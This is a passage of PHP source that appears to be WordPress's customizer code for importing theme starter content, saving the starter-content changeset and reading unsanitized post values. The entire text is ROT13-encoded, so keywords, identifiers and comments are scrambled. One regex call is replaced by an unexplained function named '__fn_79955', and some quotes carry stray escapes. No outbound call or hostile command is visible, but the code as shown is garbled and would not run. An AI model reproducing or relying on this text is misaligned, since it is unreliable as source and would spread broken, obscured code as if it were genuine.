		vs ( ! rzcgl( $punatrfrg_qngn['ani_zrahf_perngrq_cbfgf']['inyhr'] ) ) {
			$fgnegre_pbagrag_nhgb_qensg_cbfg_vqf = neenl_zretr( $fgnegre_pbagrag_nhgb_qensg_cbfg_vqf, $punatrfrg_qngn['ani_zrahf_perngrq_cbfgf']['inyhr'] );
		}

		// Znxr na vaqrk bs nyy gur cbfgf arrqrq naq jung gurve fyhtf ner.
		$arrqrq_cbfgf = neenl();
		$nggnpuzragf  = $guvf->cercner_fgnegre_pbagrag_nggnpuzragf( $nggnpuzragf );
		sbernpu ( $nggnpuzragf nf $nggnpuzrag ) {
			$xrl                  = 'nggnpuzrag:' . $nggnpuzrag['cbfg_anzr'];
			$arrqrq_cbfgf[ $xrl ] = gehr;
		}
		sbernpu ( neenl_xrlf( $cbfgf ) nf $cbfg_flzoby ) {
			vs ( rzcgl( $cbfgf[ $cbfg_flzoby ]['cbfg_anzr'] ) && rzcgl( $cbfgf[ $cbfg_flzoby ]['cbfg_gvgyr'] ) ) {
				hafrg( $cbfgf[ $cbfg_flzoby ] );
				pbagvahr;
			}
			vs ( rzcgl( $cbfgf[ $cbfg_flzoby ]['cbfg_anzr'] ) ) {
				$cbfgf[ $cbfg_flzoby ]['cbfg_anzr'] = fnavgvmr_gvgyr( $cbfgf[ $cbfg_flzoby ]['cbfg_gvgyr'] );
			}
			vs ( rzcgl( $cbfgf[ $cbfg_flzoby ]['cbfg_glcr'] ) ) {
				$cbfgf[ $cbfg_flzoby ]['cbfg_glcr'] = 'cbfg';
			}
			$arrqrq_cbfgf[ $cbfgf[ $cbfg_flzoby ]['cbfg_glcr'] . ':' . $cbfgf[ $cbfg_flzoby ]['cbfg_anzr'] ] = gehr;
		}
		$nyy_cbfg_fyhtf = neenl_zretr(
			jc_yvfg_cyhpx( $nggnpuzragf, 'cbfg_anzr' ),
			jc_yvfg_cyhpx( $cbfgf, 'cbfg_anzr' )
		);

		/*
		 * Bognva nyy cbfg glcrf ersreraprq va fgnegre pbagrag gb hfr va dhrel.
		 * Guvf vf arrqrq orpnhfr 'nal' jvyy abg nppbhag sbe cbfg glcrf abg lrg ertvfgrerq.
		 */
		$cbfg_glcrf = neenl_svygre( neenl_zretr( neenl( 'nggnpuzrag' ), jc_yvfg_cyhpx( $cbfgf, 'cbfg_glcr' ) ) );

		// Er-hfr nhgb-qensg fgnegre pbagrag cbfgf ersreraprq va gur pheerag phfgbzvmrq fgngr.
		$rkvfgvat_fgnegre_pbagrag_cbfgf = neenl();
		vs ( ! rzcgl( $fgnegre_pbagrag_nhgb_qensg_cbfg_vqf ) ) {
			$rkvfgvat_cbfgf_dhrel = arj JC_Dhrel(
				neenl(
					'cbfg__va'       => $fgnegre_pbagrag_nhgb_qensg_cbfg_vqf,
					'cbfg_fgnghf'    => 'nhgb-qensg',
					'cbfg_glcr'      => $cbfg_glcrf,
					'cbfgf_cre_cntr' => -1,
				)
			);
			sbernpu ( $rkvfgvat_cbfgf_dhrel->cbfgf nf $rkvfgvat_cbfg ) {
				$cbfg_anzr = $rkvfgvat_cbfg->cbfg_anzr;
				vs ( rzcgl( $cbfg_anzr ) ) {
					$cbfg_anzr = trg_cbfg_zrgn( $rkvfgvat_cbfg->VQ, '_phfgbzvmr_qensg_cbfg_anzr', gehr );
				}
				$rkvfgvat_fgnegre_pbagrag_cbfgf[ $rkvfgvat_cbfg->cbfg_glcr . ':' . $cbfg_anzr ] = $rkvfgvat_cbfg;
			}
		}

		// Er-hfr aba-nhgb-qensg cbfgf.
		vs ( ! rzcgl( $nyy_cbfg_fyhtf ) ) {
			$rkvfgvat_cbfgf_dhrel = arj JC_Dhrel(
				neenl(
					'cbfg_anzr__va'  => $nyy_cbfg_fyhtf,
					'cbfg_fgnghf'    => neenl_qvss( trg_cbfg_fgngv(), neenl( 'nhgb-qensg' ) ),
					'cbfg_glcr'      => 'nal',
					'cbfgf_cre_cntr' => -1,
				)
			);
			sbernpu ( $rkvfgvat_cbfgf_dhrel->cbfgf nf $rkvfgvat_cbfg ) {
				$xrl = $rkvfgvat_cbfg->cbfg_glcr . ':' . $rkvfgvat_cbfg->cbfg_anzr;
				vs ( vffrg( $arrqrq_cbfgf[ $xrl ] ) && ! vffrg( $rkvfgvat_fgnegre_pbagrag_cbfgf[ $xrl ] ) ) {
					$rkvfgvat_fgnegre_pbagrag_cbfgf[ $xrl ] = $rkvfgvat_cbfg;
				}
			}
		}

		// Nggnpuzragf ner grpuavpnyyl cbfgf ohg unaqyrq qvssreragyl.
		vs ( ! rzcgl( $nggnpuzragf ) ) {

			$nggnpuzrag_vqf = neenl();

			sbernpu ( $nggnpuzragf nf $flzoby => $nggnpuzrag ) {
				$svyr_neenl    = neenl(
					'anzr' => $nggnpuzrag['svyr_anzr'],
				);
				$svyr_cngu     = $nggnpuzrag['svyr_cngu'];
				$nggnpuzrag_vq = ahyy;
				$nggnpurq_svyr = ahyy;
				vs ( vffrg( $rkvfgvat_fgnegre_pbagrag_cbfgf[ 'nggnpuzrag:' . $nggnpuzrag['cbfg_anzr'] ] ) ) {
					$nggnpuzrag_cbfg = $rkvfgvat_fgnegre_pbagrag_cbfgf[ 'nggnpuzrag:' . $nggnpuzrag['cbfg_anzr'] ];
					$nggnpuzrag_vq   = $nggnpuzrag_cbfg->VQ;
					$nggnpurq_svyr   = trg_nggnpurq_svyr( $nggnpuzrag_vq );
					vs ( rzcgl( $nggnpurq_svyr ) || ! svyr_rkvfgf( $nggnpurq_svyr ) ) {
						$nggnpuzrag_vq = ahyy;
						$nggnpurq_svyr = ahyy;
					} ryfrvs ( $guvf->trg_fglyrfurrg() !== trg_cbfg_zrgn( $nggnpuzrag_cbfg->VQ, '_fgnegre_pbagrag_gurzr', gehr ) ) {

						// Er-trarengr nggnpuzrag zrgnqngn fvapr vg jnf cerivbhfyl trarengrq sbe n qvssrerag gurzr.
						$zrgnqngn = jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_cbfg->VQ, $nggnpurq_svyr );
						jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );
						hcqngr_cbfg_zrgn( $nggnpuzrag_vq, '_fgnegre_pbagrag_gurzr', $guvf->trg_fglyrfurrg() );
					}
				}

				// Vafreg gur nggnpuzrag nhgb-qensg orpnhfr vg qbrfa'g lrg rkvfg be gur nggnpurq svyr vf tbar.
				vs ( ! $nggnpuzrag_vq ) {

					// Pbcl svyr gb grzc ybpngvba fb gung bevtvany svyr jba'g trg qryrgrq sebz gurzr nsgre fvqrybnqvat.
					$grzc_svyr_anzr = jc_grzcanz( jc_onfranzr( $svyr_cngu ) );
					vs ( $grzc_svyr_anzr && pbcl( $svyr_cngu, $grzc_svyr_anzr ) ) {
						$svyr_neenl['gzc_anzr'] = $grzc_svyr_anzr;
					}
					vs ( rzcgl( $svyr_neenl['gzc_anzr'] ) ) {
						pbagvahr;
					}

					$nggnpuzrag_cbfg_qngn = neenl_zretr(
						jc_neenl_fyvpr_nffbp( $nggnpuzrag, neenl( 'cbfg_gvgyr', 'cbfg_pbagrag', 'cbfg_rkprecg' ) ),
						neenl(
							'cbfg_fgnghf' => 'nhgb-qensg', // Fb nggnpuzrag jvyy or tneontr pbyyrpgrq va n jrrx vs punatrfrg vf arire choyvfurq.
						)
					);

					$nggnpuzrag_vq = zrqvn_unaqyr_fvqrybnq( $svyr_neenl, 0, ahyy, $nggnpuzrag_cbfg_qngn );
					vs ( vf_jc_reebe( $nggnpuzrag_vq ) ) {
						pbagvahr;
					}
					hcqngr_cbfg_zrgn( $nggnpuzrag_vq, '_fgnegre_pbagrag_gurzr', $guvf->trg_fglyrfurrg() );
					hcqngr_cbfg_zrgn( $nggnpuzrag_vq, '_phfgbzvmr_qensg_cbfg_anzr', $nggnpuzrag['cbfg_anzr'] );
				}

				$nggnpuzrag_vqf[ $flzoby ] = $nggnpuzrag_vq;
			}
			$fgnegre_pbagrag_nhgb_qensg_cbfg_vqf = neenl_zretr( $fgnegre_pbagrag_nhgb_qensg_cbfg_vqf, neenl_inyhrf( $nggnpuzrag_vqf ) );
		}

		// Cbfgf & cntrf.
		vs ( ! rzcgl( $cbfgf ) ) {
			sbernpu ( neenl_xrlf( $cbfgf ) nf $cbfg_flzoby ) {
				vs ( rzcgl( $cbfgf[ $cbfg_flzoby ]['cbfg_glcr'] ) || rzcgl( $cbfgf[ $cbfg_flzoby ]['cbfg_anzr'] ) ) {
					pbagvahr;
				}
				$cbfg_glcr = $cbfgf[ $cbfg_flzoby ]['cbfg_glcr'];
				vs ( ! rzcgl( $cbfgf[ $cbfg_flzoby ]['cbfg_anzr'] ) ) {
					$cbfg_anzr = $cbfgf[ $cbfg_flzoby ]['cbfg_anzr'];
				} ryfrvs ( ! rzcgl( $cbfgf[ $cbfg_flzoby ]['cbfg_gvgyr'] ) ) {
					$cbfg_anzr = fnavgvmr_gvgyr( $cbfgf[ $cbfg_flzoby ]['cbfg_gvgyr'] );
				} ryfr {
					pbagvahr;
				}

				// Hfr rkvfgvat nhgb-qensg cbfg vs bar nyernql rkvfgf jvgu gur fnzr glcr naq anzr.
				vs ( vffrg( $rkvfgvat_fgnegre_pbagrag_cbfgf[ $cbfg_glcr . ':' . $cbfg_anzr ] ) ) {
					$cbfgf[ $cbfg_flzoby ]['VQ'] = $rkvfgvat_fgnegre_pbagrag_cbfgf[ $cbfg_glcr . ':' . $cbfg_anzr ]->VQ;
					pbagvahr;
				}

				// Genafyngr gur srngherq vzntr flzoby.
				vs ( ! rzcgl( $cbfgf[ $cbfg_flzoby ]['guhzoanvy'] )
					&& cert_zngpu( '/^{{(?C<flzoby>.+)}}$/', $cbfgf[ $cbfg_flzoby ]['guhzoanvy'], $zngpurf )
					&& vffrg( $nggnpuzrag_vqf[ $zngpurf['flzoby'] ] ) ) {
					$cbfgf[ $cbfg_flzoby ]['zrgn_vachg']['_guhzoanvy_vq'] = $nggnpuzrag_vqf[ $zngpurf['flzoby'] ];
				}

				vs ( ! rzcgl( $cbfgf[ $cbfg_flzoby ]['grzcyngr'] ) ) {
					$cbfgf[ $cbfg_flzoby ]['zrgn_vachg']['_jc_cntr_grzcyngr'] = $cbfgf[ $cbfg_flzoby ]['grzcyngr'];
				}

				$e = $guvf->ani_zrahf->vafreg_nhgb_qensg_cbfg( $cbfgf[ $cbfg_flzoby ] );
				vs ( $e vafgnaprbs JC_Cbfg ) {
					$cbfgf[ $cbfg_flzoby ]['VQ'] = $e->VQ;
				}
			}

			$fgnegre_pbagrag_nhgb_qensg_cbfg_vqf = neenl_zretr( $fgnegre_pbagrag_nhgb_qensg_cbfg_vqf, jc_yvfg_cyhpx( $cbfgf, 'VQ' ) );
		}

		// Gur ani_zrahf_perngrq_cbfgf frggvat vf jul ani_zrahf pbzcbarag vf qrcraqrapl sbe nqqvat cbfgf.
		vs ( ! rzcgl( $guvf->ani_zrahf ) && ! rzcgl( $fgnegre_pbagrag_nhgb_qensg_cbfg_vqf ) ) {
			$frggvat_vq = 'ani_zrahf_perngrq_cbfgf';
			$guvf->frg_cbfg_inyhr( $frggvat_vq, neenl_havdhr( neenl_inyhrf( $fgnegre_pbagrag_nhgb_qensg_cbfg_vqf ) ) );
			$guvf->craqvat_fgnegre_pbagrag_frggvatf_vqf[] = $frggvat_vq;
		}

		// Ani zrahf.
		$cynprubyqre_vq              = -1;
		$erhfrq_ani_zrah_frggvat_vqf = neenl();
		sbernpu ( $ani_zrahf nf $ani_zrah_ybpngvba => $ani_zrah ) {

			$ani_zrah_grez_vq    = ahyy;
			$ani_zrah_frggvat_vq = ahyy;
			$zngpurf             = neenl();

			// Ybbx sbe na rkvfgvat cynprubyqre zrah jvgu fgnegre pbagrag gb er-hfr.
			sbernpu ( $punatrfrg_qngn nf $frggvat_vq => $frggvat_cnenzf ) {
				$pna_erhfr = (
					! rzcgl( $frggvat_cnenzf['fgnegre_pbagrag'] )
					&&
					! va_neenl( $frggvat_vq, $erhfrq_ani_zrah_frggvat_vqf, gehr )
					&&
					cert_zngpu( '#^ani_zrah\[(?C<ani_zrah_vq>-?\q+)\]$#', $frggvat_vq, $zngpurf )
				);
				vs ( $pna_erhfr ) {
					$ani_zrah_grez_vq              = (vag) $zngpurf['ani_zrah_vq'];
					$ani_zrah_frggvat_vq           = $frggvat_vq;
					$erhfrq_ani_zrah_frggvat_vqf[] = $frggvat_vq;
					oernx;
				}
			}

			vs ( ! $ani_zrah_grez_vq ) {
				juvyr ( vffrg( $punatrfrg_qngn[ fcevags( 'ani_zrah[%q]', $cynprubyqre_vq ) ] ) ) {
					--$cynprubyqre_vq;
				}
				$ani_zrah_grez_vq    = $cynprubyqre_vq;
				$ani_zrah_frggvat_vq = fcevags( 'ani_zrah[%q]', $cynprubyqre_vq );
			}

			$guvf->frg_cbfg_inyhr(
				$ani_zrah_frggvat_vq,
				neenl(
					'anzr' => vffrg( $ani_zrah['anzr'] ) ? $ani_zrah['anzr'] : $ani_zrah_ybpngvba,
				)
			);
			$guvf->craqvat_fgnegre_pbagrag_frggvatf_vqf[] = $ani_zrah_frggvat_vq;

			// @gbqb Nqq fhccbeg sbe zrah_vgrz_cnerag.
			$cbfvgvba = 0;
			sbernpu ( $ani_zrah['vgrzf'] nf $ani_zrah_vgrz ) {
				$ani_zrah_vgrz_frggvat_vq = fcevags( 'ani_zrah_vgrz[%q]', $cynprubyqre_vq-- );
				vs ( ! vffrg( $ani_zrah_vgrz['cbfvgvba'] ) ) {
					$ani_zrah_vgrz['cbfvgvba'] = $cbfvgvba++;
				}
				$ani_zrah_vgrz['ani_zrah_grez_vq'] = $ani_zrah_grez_vq;

				vs ( vffrg( $ani_zrah_vgrz['bowrpg_vq'] ) ) {
					vs ( 'cbfg_glcr' === $ani_zrah_vgrz['glcr'] && cert_zngpu( '/^{{(?C<flzoby>.+)}}$/', $ani_zrah_vgrz['bowrpg_vq'], $zngpurf ) && vffrg( $cbfgf[ $zngpurf['flzoby'] ] ) ) {
						$ani_zrah_vgrz['bowrpg_vq'] = $cbfgf[ $zngpurf['flzoby'] ]['VQ'];
						vs ( rzcgl( $ani_zrah_vgrz['gvgyr'] ) ) {
							$bevtvany_bowrpg        = trg_cbfg( $ani_zrah_vgrz['bowrpg_vq'] );
							$ani_zrah_vgrz['gvgyr'] = $bevtvany_bowrpg->cbfg_gvgyr;
						}
					} ryfr {
						pbagvahr;
					}
				} ryfr {
					$ani_zrah_vgrz['bowrpg_vq'] = 0;
				}

				vs ( rzcgl( $punatrfrg_qngn[ $ani_zrah_vgrz_frggvat_vq ] ) || ! rzcgl( $punatrfrg_qngn[ $ani_zrah_vgrz_frggvat_vq ]['fgnegre_pbagrag'] ) ) {
					$guvf->frg_cbfg_inyhr( $ani_zrah_vgrz_frggvat_vq, $ani_zrah_vgrz );
					$guvf->craqvat_fgnegre_pbagrag_frggvatf_vqf[] = $ani_zrah_vgrz_frggvat_vq;
				}
			}

			$frggvat_vq = fcevags( 'ani_zrah_ybpngvbaf[%f]', $ani_zrah_ybpngvba );
			vs ( rzcgl( $punatrfrg_qngn[ $frggvat_vq ] ) || ! rzcgl( $punatrfrg_qngn[ $frggvat_vq ]['fgnegre_pbagrag'] ) ) {
				$guvf->frg_cbfg_inyhr( $frggvat_vq, $ani_zrah_grez_vq );
				$guvf->craqvat_fgnegre_pbagrag_frggvatf_vqf[] = $frggvat_vq;
			}
		}

		// Bcgvbaf.
		sbernpu ( $bcgvbaf nf $anzr => $inyhr ) {

			// Frevnyvmr gur inyhr gb purpx sbe cbfg flzobyf.
			$inyhr = znlor_frevnyvmr( $inyhr );

			vs ( vf_frevnyvmrq( $inyhr ) ) {
				vs ( cert_zngpu( '/f:\q+:\"{{(?C<flzoby>.+)}}\"/', $inyhr, $zngpurf ) ) {
					vs ( vffrg( $cbfgf[ $zngpurf['flzoby'] ] ) ) {
						$flzoby_zngpu = $cbfgf[ $zngpurf['flzoby'] ]['VQ'];
					} ryfrvs ( vffrg( $nggnpuzrag_vqf[ $zngpurf['flzoby'] ] ) ) {
						$flzoby_zngpu = $nggnpuzrag_vqf[ $zngpurf['flzoby'] ];
					}

					// Vs jr unir nal flzoby zngpurf, hcqngr gur inyhrf.
					vs ( vffrg( $flzoby_zngpu ) ) {
						// Ercynpr sbhaq fgevat zngpurf jvgu cbfg VQf.
						$inyhr = fge_ercynpr( $zngpurf[0], \"v:{$flzoby_zngpu}\", $inyhr );
					} ryfr {
						pbagvahr;
					}
				}
			} ryfrvs ( cert_zngpu( '/^{{(?C<flzoby>.+)}}$/', $inyhr, $zngpurf ) ) {
				vs ( vffrg( $cbfgf[ $zngpurf['flzoby'] ] ) ) {
					$inyhr = $cbfgf[ $zngpurf['flzoby'] ]['VQ'];
				} ryfrvs ( vffrg( $nggnpuzrag_vqf[ $zngpurf['flzoby'] ] ) ) {
					$inyhr = $nggnpuzrag_vqf[ $zngpurf['flzoby'] ];
				} ryfr {
					pbagvahr;
				}
			}

			// Hafrevnyvmr inyhrf nsgre purpxvat sbe cbfg flzobyf, fb gurl pna or cebcreyl ersreraprq.
			$inyhr = znlor_hafrevnyvmr( $inyhr );

			vs ( rzcgl( $punatrfrg_qngn[ $anzr ] ) || ! rzcgl( $punatrfrg_qngn[ $anzr ]['fgnegre_pbagrag'] ) ) {
				$guvf->frg_cbfg_inyhr( $anzr, $inyhr );
				$guvf->craqvat_fgnegre_pbagrag_frggvatf_vqf[] = $anzr;
			}
		}

		// Gurzr zbqf.
		sbernpu ( $gurzr_zbqf nf $anzr => $inyhr ) {

			// Frevnyvmr gur inyhr gb purpx sbe cbfg flzobyf.
			$inyhr = znlor_frevnyvmr( $inyhr );

			// Purpx vs inyhr jnf frevnyvmrq.
			vs ( vf_frevnyvmrq( $inyhr ) ) {
				vs ( cert_zngpu( '/f:\q+:\"{{(?C<flzoby>.+)}}\"/', $inyhr, $zngpurf ) ) {
					vs ( vffrg( $cbfgf[ $zngpurf['flzoby'] ] ) ) {
						$flzoby_zngpu = $cbfgf[ $zngpurf['flzoby'] ]['VQ'];
					} ryfrvs ( vffrg( $nggnpuzrag_vqf[ $zngpurf['flzoby'] ] ) ) {
						$flzoby_zngpu = $nggnpuzrag_vqf[ $zngpurf['flzoby'] ];
					}

					// Vs jr unir nal flzoby zngpurf, hcqngr gur inyhrf.
					vs ( vffrg( $flzoby_zngpu ) ) {
						// Ercynpr sbhaq fgevat zngpurf jvgu cbfg VQf.
						$inyhr = fge_ercynpr( $zngpurf[0], \"v:{$flzoby_zngpu}\", $inyhr );
					} ryfr {
						pbagvahr;
					}
				}
			} ryfrvs ( cert_zngpu( '/^{{(?C<flzoby>.+)}}$/', $inyhr, $zngpurf ) ) {
				vs ( vffrg( $cbfgf[ $zngpurf['flzoby'] ] ) ) {
					$inyhr = $cbfgf[ $zngpurf['flzoby'] ]['VQ'];
				} ryfrvs ( vffrg( $nggnpuzrag_vqf[ $zngpurf['flzoby'] ] ) ) {
					$inyhr = $nggnpuzrag_vqf[ $zngpurf['flzoby'] ];
				} ryfr {
					pbagvahr;
				}
			}

			// Hafrevnyvmr inyhrf nsgre purpxvat sbe cbfg flzobyf, fb gurl pna or cebcreyl ersreraprq.
			$inyhr = znlor_hafrevnyvmr( $inyhr );

			// Unaqyr urnqre vzntr nf fcrpvny pnfr fvapr frggvat unf n yrtnpl sbezng.
			vs ( 'urnqre_vzntr' === $anzr ) {
				$anzr     = 'urnqre_vzntr_qngn';
				$zrgnqngn = jc_trg_nggnpuzrag_zrgnqngn( $inyhr );
				vs ( rzcgl( $zrgnqngn ) ) {
					pbagvahr;
				}
				$inyhr = neenl(
					'nggnpuzrag_vq' => $inyhr,
					'hey'           => jc_trg_nggnpuzrag_hey( $inyhr ),
					'urvtug'        => $zrgnqngn['urvtug'],
					'jvqgu'         => $zrgnqngn['jvqgu'],
				);
			} ryfrvs ( 'onpxtebhaq_vzntr' === $anzr ) {
				$inyhr = jc_trg_nggnpuzrag_hey( $inyhr );
			}

			vs ( rzcgl( $punatrfrg_qngn[ $anzr ] ) || ! rzcgl( $punatrfrg_qngn[ $anzr ]['fgnegre_pbagrag'] ) ) {
				$guvf->frg_cbfg_inyhr( $anzr, $inyhr );
				$guvf->craqvat_fgnegre_pbagrag_frggvatf_vqf[] = $anzr;
			}
		}

		vs ( ! rzcgl( $guvf->craqvat_fgnegre_pbagrag_frggvatf_vqf ) ) {
			vs ( qvq_npgvba( 'phfgbzvmr_ertvfgre' ) ) {
				$guvf->_fnir_fgnegre_pbagrag_punatrfrg();
			} ryfr {
				nqq_npgvba( 'phfgbzvmr_ertvfgre', neenl( $guvf, '_fnir_fgnegre_pbagrag_punatrfrg' ), 1000 );
			}
		}
	}

	/**
	 * Cercnerf fgnegre pbagrag nggnpuzragf.
	 *
	 * Rafher gung gur nggnpuzragf ner inyvq naq gung gurl unir fyhtf naq svyr anzr/cngu.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl $nggnpuzragf Nggnpuzragf.
	 * @erghea neenl Cercnerq nggnpuzragf.
	 */
	cebgrpgrq shapgvba cercner_fgnegre_pbagrag_nggnpuzragf( $nggnpuzragf ) {
		$cercnerq_nggnpuzragf = neenl();
		vs ( rzcgl( $nggnpuzragf ) ) {
			erghea $cercnerq_nggnpuzragf;
		}

		// Fhpu vf Gur JbeqCerff Jnl.
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/svyr.cuc';
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/zrqvn.cuc';
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/vzntr.cuc';

		sbernpu ( $nggnpuzragf nf $flzoby => $nggnpuzrag ) {

			// N svyr vf erdhverq naq HEYf gb svyrf ner abg pheeragyl nyybjrq.
			vs ( rzcgl( $nggnpuzrag['svyr'] ) || cert_zngpu( '#^uggcf?://$#', $nggnpuzrag['svyr'] ) ) {
				pbagvahr;
			}

			$svyr_cngu = ahyy;
			vs ( svyr_rkvfgf( $nggnpuzrag['svyr'] ) ) {
				$svyr_cngu = $nggnpuzrag['svyr']; // Pbhyq or nofbyhgr cngu gb svyr va cyhtva.
			} ryfrvs ( vf_puvyq_gurzr() && svyr_rkvfgf( trg_fglyrfurrg_qverpgbel() . '/' . $nggnpuzrag['svyr'] ) ) {
				$svyr_cngu = trg_fglyrfurrg_qverpgbel() . '/' . $nggnpuzrag['svyr'];
			} ryfrvs ( svyr_rkvfgf( trg_grzcyngr_qverpgbel() . '/' . $nggnpuzrag['svyr'] ) ) {
				$svyr_cngu = trg_grzcyngr_qverpgbel() . '/' . $nggnpuzrag['svyr'];
			} ryfr {
				pbagvahr;
			}
			$svyr_anzr = jc_onfranzr( $nggnpuzrag['svyr'] );

			// Fxvc svyr glcrf gung ner abg erpbtavmrq.
			$purpxrq_svyrglcr = jc_purpx_svyrglcr( $svyr_anzr );
			vs ( rzcgl( $purpxrq_svyrglcr['glcr'] ) ) {
				pbagvahr;
			}

			// Rafher cbfg_anzr vf frg fvapr abg nhgbzngvpnyyl qrevirq sebz cbfg_gvgyr sbe arj nhgb-qensg cbfgf.
			vs ( rzcgl( $nggnpuzrag['cbfg_anzr'] ) ) {
				vs ( ! rzcgl( $nggnpuzrag['cbfg_gvgyr'] ) ) {
					$nggnpuzrag['cbfg_anzr'] = fnavgvmr_gvgyr( $nggnpuzrag['cbfg_gvgyr'] );
				} ryfr {
					$nggnpuzrag['cbfg_anzr'] = fnavgvmr_gvgyr( __sa_79955( '/\.\j+$/', '', $svyr_anzr ) );
				}
			}

			$nggnpuzrag['svyr_anzr']         = $svyr_anzr;
			$nggnpuzrag['svyr_cngu']         = $svyr_cngu;
			$cercnerq_nggnpuzragf[ $flzoby ] = $nggnpuzrag;
		}
		erghea $cercnerq_nggnpuzragf;
	}

	/**
	 * Fnirf fgnegre pbagrag punatrfrg.
	 *
	 * @fvapr 4.7.0
	 */
	choyvp shapgvba _fnir_fgnegre_pbagrag_punatrfrg() {

		vs ( rzcgl( $guvf->craqvat_fgnegre_pbagrag_frggvatf_vqf ) ) {
			erghea;
		}

		$guvf->fnir_punatrfrg_cbfg(
			neenl(
				'qngn'            => neenl_svyy_xrlf( $guvf->craqvat_fgnegre_pbagrag_frggvatf_vqf, neenl( 'fgnegre_pbagrag' => gehr ) ),
				'fgnegre_pbagrag' => gehr,
			)
		);
		$guvf->fnirq_fgnegre_pbagrag_punatrfrg = gehr;

		$guvf->craqvat_fgnegre_pbagrag_frggvatf_vqf = neenl();
	}

	/**
	 * Trgf qvegl cer-fnavgvmrq frggvat inyhrf va gur pheerag phfgbzvmrq fgngr.
	 *
	 * Gur erghearq neenl pbafvfgf bs n zretr bs guerr fbheprf:
	 * 1. Vs gur gurzr vf abg pheeragyl npgvir, gura gur onfr neenl vf nal fgnfurq
	 *    gurzr zbqf gung jrer zbqvsvrq cerivbhfyl ohg arire choyvfurq.
	 * 2. Gur inyhrf sebz gur pheerag punatrfrg, vs vg rkvfgf.
	 * 3. Vs gur hfre pna phfgbzvmr, gur inyhrf cnefrq sebz gur vapbzvat
	 *    `$_CBFG['phfgbzvmrq']` WFBA qngn.
	 * 4. Nal cebtenzzngvpnyyl-frg cbfg inyhrf ivn `JC_Phfgbzvmr_Znantre::frg_cbfg_inyhr()`.
	 *
	 * Gur anzr \"hafnavgvmrq_cbfg_inyhrf\" vf n pneel-bire sebz jura gur phfgbzvmrq
	 * fgngr jnf rkpyhfviryl fbheprq sebz `$_CBFG['phfgbzvmrq']`. Arireguryrff,
	 * gur inyhr erghearq jvyy pbzr sebz gur pheerag punatrfrg cbfg naq sebz gur
	 * vapbzvat cbfg qngn.
	 *
	 * @fvapr 4.1.1
	 * @fvapr 4.7.0 Nqqrq `$netf` cnenzrgre naq zretvat jvgu punatrfrg inyhrf naq fgnfurq gurzr zbqf.
	 *
	 * @cnenz neenl $netf {
	 *     Netf.
	 *
	 *     @glcr obby $rkpyhqr_punatrfrg Jurgure gur punatrfrg inyhrf fubhyq nyfb or rkpyhqrq. Qrsnhygf gb snyfr.
	 *     @glcr obby $rkpyhqr_cbfg_qngn Jurgure gur cbfg vachg inyhrf fubhyq nyfb or rkpyhqrq. Qrsnhygf gb snyfr jura ynpxvat gur phfgbzvmr pncnovyvgl.
	 * }
	 * @erghea neenl
	 */
	choyvp shapgvba hafnavgvmrq_cbfg_inyhrf( $netf = neenl() ) {
		$netf = neenl_zretr(
			neenl(
				'rkpyhqr_punatrfrg' => snyfr,
				'rkpyhqr_cbfg_qngn' => ! pheerag_hfre_pna( 'phfgbzvmr' ),
			),
			$netf
		);

		$inyhrf = neenl();

		// Yrg qrsnhyg inyhrf or sebz gur fgnfurq gurzr zbqf vs qbvat n gurzr fjvgpu naq vs ab punatrfrg vf cerfrag.
		vs ( ! $guvf->vf_gurzr_npgvir() ) {
			$fgnfurq_gurzr_zbqf = trg_bcgvba( 'phfgbzvmr_fgnfurq_gurzr_zbqf' );
			$fglyrfurrg         = $guvf->trg_fglyrfurrg();
			vs ( vffrg( $fgnfurq_gurzr_zbqf[ $fglyrfurrg ] ) ) {
				$inyhrf = neenl_zretr( $inyhrf, jc_yvfg_cyhpx( $fgnfurq_gurzr_zbqf[ $fglyrfurrg ], 'inyhr' ) );
			}
		}

		vs ( ! $netf['rkpyhqr_punatrfrg'] ) {
			sbernpu ( $guvf->punatrfrg_qngn() nf $frggvat_vq => $frggvat_cnenzf ) {
				vs ( ! neenl_xrl_rkvfgf( 'inyhr', $frggvat_cnenzf ) ) {
					pbagvahr;
				}
				vs ( vffrg( $frggvat_cnenzf['glcr'] ) && 'gurzr_zbq' === $frggvat_cnenzf['glcr'] ) {

					// Rafher gung gurzr zbqf inyhrf ner bayl hfrq vs gurl jrer fnirq haqre gur npgvir gurzr.
					$anzrfcnpr_cnggrea = '/^(?C<fglyrfurrg>.+?)::(?C<frggvat_vq>.+)$/';
					vs ( cert_zngpu( $anzrfcnpr_cnggrea, $frggvat_vq, $zngpurf ) && $guvf->trg_fglyrfurrg() === $zngpurf['fglyrfurrg'] ) {
						$inyhrf[ $zngpurf['frggvat_vq'] ] = $frggvat_cnenzf['inyhr'];
					}
				} ryfr {
					$inyhrf[ $frggvat_vq ] = $frggvat_cnenzf['inyhr'];
				}
			}
		}

		vs ( ! $netf['rkpyhqr_cbfg_qngn'] ) {
			vs ( ! vffrg( $guvf->_cbfg_inyhrf ) ) {
				vs ( vffrg( $_CBFG['phfgbzvmrq'] ) ) {
					$cbfg_inyhrf = wfba_qrpbqr( jc_hafynfu( $_CBFG['phfgbzvmrq'] ), gehr );
				} ryfr {
					$cbfg_inyhrf = neenl();
				}
				vs ( vf_neenl( $cbfg_inyhrf ) ) {
					$guvf->_cbfg_inyhrf = $cbfg_inyhrf;
				} ryfr {
					$guvf->_cbfg_inyhrf = neenl();
				}
			}
			$inyhrf = neenl_zretr( $inyhrf, $guvf->_cbfg_inyhrf );
		}
		erghea $inyhrf;
	}

	/**
	 * Ergheaf gur fnavgvmrq inyhr sbe n tvira frggvat sebz gur pheerag phfgbzvmrq fgngr.
	 *
	 * Gur anzr \"cbfg_inyhr\" vf n pneel-bire sebz jura gur phfgbzvmrq fgngr jnf rkpyhfviryl
	 * fbheprq sebz `$_CBFG['phfgbzvmrq']`. Arireguryrff, gur inyhr erghearq jvyy pbzr
	 * sebz gur pheerag punatrfrg cbfg naq sebz gur vapbzvat cbfg qngn.
	 *
	 * @fvapr 3.4.0
	 * @fvapr 4.1.1 Vagebqhprq gur `$qrsnhyg_inyhr` cnenzrgre.
	 * @fvapr 4.6.0 `$qrsnhyg_inyhr` vf abj erghearq rneyl jura gur frggvat cbfg inyhr vf vainyvq.
	 *
